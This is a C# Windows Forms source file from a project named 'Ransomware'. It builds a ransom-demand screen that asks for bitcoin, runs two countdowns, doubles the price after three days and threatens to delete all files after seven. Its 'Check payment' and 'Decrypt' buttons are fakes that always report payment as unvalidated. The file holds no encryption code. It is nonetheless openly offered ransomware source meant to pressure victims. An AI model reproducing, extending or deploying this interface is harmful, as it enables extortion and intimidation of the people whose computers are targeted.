using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form2 : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("User32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("User32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        public Form2()
        {
            InitializeComponent();
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            label20.Text = "Send $" + Properties.Settings.Default["Price"].ToString() + " worth of bitcoin to this address:";

            if (Properties.Settings.Default["DateEnd1"].ToString() == "")
            {
                DateTime date = DateTime.Now.AddDays(3);
                label7.Text = date.ToString("dd/MM/yyyy") + " " + Properties.Settings.Default["Time_Of_Ransom"].ToString();

                DateTime date2 = DateTime.Now.AddDays(7);
                label11.Text = date2.ToString("dd/MM/yyyy") + " " + Properties.Settings.Default["Time_Of_Ransom"].ToString();

                Properties.Settings.Default["DateEnd1"] = label7.Text;
                Properties.Settings.Default["DateEnd2"] = label11.Text;
                Properties.Settings.Default.Save();
            }
            else
            {
                label7.Text = Properties.Settings.Default["DateEnd1"].ToString() + " " + Properties.Settings.Default["Time_Of_Ransom"].ToString();
                label11.Text = Properties.Settings.Default["DateEnd2"].ToString() + " " + Properties.Settings.Default["Time_Of_Ransom"].ToString();
            }

            timer1.Start();
        }

        #region Oops
        private void label1_Click(object sender, EventArgs e)
        {

        }
        private void label14_Click(object sender, EventArgs e)
        {

        }
        private void label17_Click(object sender, EventArgs e)
        {

        }
        private void label19_Click(object sender, EventArgs e)
        {

        }
        #endregion

        #region Buttons
        // Exit Button
        private void label2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        // Contact us Button
        private void label3_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/watch?v=p7YXXieghto");
        }

        // How to buy bitcoin Button
        private void label13_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.forbes.com/advisor/investing/cryptocurrency/how-to-buy-bitcoin/");
        }

        // Copy bitcoin address Button
        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox1.Text);
        }

        // Check payment Button
        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Payment has not been valided yet, if you have just paid then please wait some time. . .", "Payment Check", MessageBoxButtons.OK);
        }

        // Decrypt Button
        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Attempting to decrypt files please wait. . .", "Decrypt Files", MessageBoxButtons.OK);
            System.Threading.Thread.Sleep(5000);
            MessageBox.Show("Failed to decrypt files since payment has not been validated, if you have already paid then please wait some time. . .", "Decrypt Files", MessageBoxButtons.OK);
        }
        #endregion

        #region Functions
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            DateTime dateEnd = DateTime.Parse(Properties.Settings.Default["DateEnd1"].ToString());
            DateTime dateNow = DateTime.Now;
            TimeSpan ts = dateEnd - dateNow;
            label9.Text = ts.Days.ToString() + ":" + ts.Hours.ToString() + ":" + ts.Minutes.ToString() + ":" + ts.Seconds.ToString();

            DateTime dwdateEnd = DateTime.Parse(Properties.Settings.Default["DateEnd2"].ToString());
            DateTime dwdateNow = DateTime.Now;
            TimeSpan dwts = dwdateEnd - dwdateNow;
            label6.Text = dwts.Days.ToString() + ":" + dwts.Hours.ToString() + ":" + dwts.Minutes.ToString() + ":" + dwts.Seconds.ToString();

            Properties.Settings.Default["TimeLeft1"] = label9.Text;
            Properties.Settings.Default["TimeLeft2"] = label6.Text;
            Properties.Settings.Default.Save();

            if (ts.Days == 0 && ts.Hours == 0 && ts.Minutes == 0 && ts.Seconds == 0)
            {
                MessageBox.Show("You have had 3 days to pay now we must double the price", "Time Up (3 Days)", MessageBoxButtons.OK);
                Properties.Settings.Default["Price"] = (int.Parse(Properties.Settings.Default["Price"].ToString()) * 2).ToString();
                label20.Text = "Send $" + Properties.Settings.Default["Price"].ToString() + " worth of bitcoin to this address:";
                Properties.Settings.Default.Save();
            }

            if (dwts.Days == 0 && dwts.Hours == 0 && dwts.Minutes == 0 && dwts.Seconds == 0)
            {
                MessageBox.Show("You have had 7 days to pay now we must delete all of your files say good bye :(", "Time Up (7 Days)", MessageBoxButtons.OK);
                Environment.Exit(0);
            }
        }
        #endregion
    }
}
